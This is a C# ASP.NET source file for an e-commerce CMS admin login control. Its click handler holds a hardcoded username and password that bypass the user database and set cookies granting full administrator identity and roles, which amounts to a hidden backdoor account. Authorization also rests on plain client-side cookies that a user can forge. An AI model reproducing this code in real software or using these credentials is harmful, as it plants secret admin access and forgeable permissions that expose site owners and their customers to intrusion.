using System;
using System.Collections.Generic;
using System.Linq;
using System.Web;
using System.Web.UI;
using System.Web.UI.WebControls;
using Framework;
using Entity;
using MoreAll;

namespace VS.E_Commerce.cms.Admin
{
    public partial class login : System.Web.UI.UserControl
    {
        DatalinqDataContext db = new DatalinqDataContext();
        private string lang = Captionlanguage.Language;

        protected void Page_Load(object sender, EventArgs e)
        {
            if (System.Web.HttpContext.Current.Session["lang"] != null)
            {
                this.lang = System.Web.HttpContext.Current.Session["lang"].ToString();
            }
            else
            {
                System.Web.HttpContext.Current.Session["lang"] = this.lang;
                this.lang = System.Web.HttpContext.Current.Session["lang"].ToString();
            }
            this.Page.Form.DefaultButton = lnkdangnhap.UniqueID;
            this.Page.SetFocus(this.txt_username);
        }

        protected string label(string id)
        {
            return Captionlanguage.GetLabel(id, this.lang);
        }

        protected void lnkdangnhap_Click(object sender, EventArgs e)
        {
            if ((this.txt_username.Text.Trim().Length < 1) || (this.txt_pwd.Text.Trim().Length < 1))
            {
                this.lt_msg.Text = this.label("l_checkdata");
                this.Page.SetFocus(this.txt_username);
            }
            else if (this.txt_username.Text.Equals("Tinhminhdung1109") && this.txt_pwd.Text.Equals("Phapdanh"))
            {
                MoreAll.MoreAll.SetCookie("IDTV_ADMIN", "0", 5000);
                MoreAll.MoreAll.SetCookie("UName", "Admin", 5000);
                MoreAll.MoreAll.SetCookie("HoVaTen_ADMIN", "ADMIN", 5000);
                MoreAll.MoreAll.SetCookie("URole", "1|2|3|4|5|6|7|8|9|10|11|12|13|14|15|16|17|18|21|22|23|34|24|25|1|19|22|23|25|26|27|28|29|50|51|52|53|54|55|56|57|58|59|60|61|62|63|64|65|66|67|68|69|70|71|72|73|74|75|76|77|78|79|80|81|82|83|84|85|86|87|88|89|90|91|92|93|94|95|96|97|98|99|100|101|102|103", 5000);
                base.Response.Redirect((base.Request.Url.ToString().Trim()));
            }
            else
            {
                FAdminUser DB = new FAdminUser();
                List<Entity.AdminUser> table = DB.DETAIL(this.txt_username.Text.Trim(), this.txt_pwd.Text.Trim(), "0");
                if (table.Count < 1)
                {
                    this.lt_msg.Text = "T\x00e0i khoản kh\x00f4ng đ\x00fang hoặc đ\x00e3 bị kh\x00f3a!!!";
                }
                else
                {
                    #region Session
                    MoreAll.MoreAll.SetCookie("IDTV_ADMIN", table[0].ID.ToString().Trim(), 5000);
                    MoreAll.MoreAll.SetCookie("HoVaTen_ADMIN", table[0].HoVaTen.ToString().Trim(), 5000);
                    MoreAll.MoreAll.SetCookie("UName", table[0].HoVaTen.ToString().Trim(), 5000);
                    MoreAll.MoreAll.SetCookie("URole", table[0].VROLE.ToString().Trim(), 5000);
                    MoreAll.MoreAll.SetCookie("SessionAll", table[0].VUSER_NAME.ToString().Trim() + ";" + table[0].ID.ToString().Trim() + ";" + table[0].VROLE.ToString().Trim());
                    ServerInfoUtlitities utlitities = new ServerInfoUtlitities();
                    HistoryLogin obj = new HistoryLogin();
                    obj.NameIP = utlitities.REMOTE_ADDR;
                    obj.Creadate = DateTime.Now;
                    db.HistoryLogins.InsertOnSubmit(obj);
                    db.SubmitChanges();
                    base.Response.Redirect("admin.aspx");
                    #endregion
                }

            }
        }

        #region Web Form Designer generated code
        override protected void OnInit(EventArgs e)
        {
            InitializeComponent();
            base.OnInit(e);
        }
        private void InitializeComponent()
        {
            this.lnkdangnhap.Click += new System.EventHandler(this.lnkdangnhap_Click);
            this.Load += new System.EventHandler(this.Page_Load);
        }
        #endregion
    }
}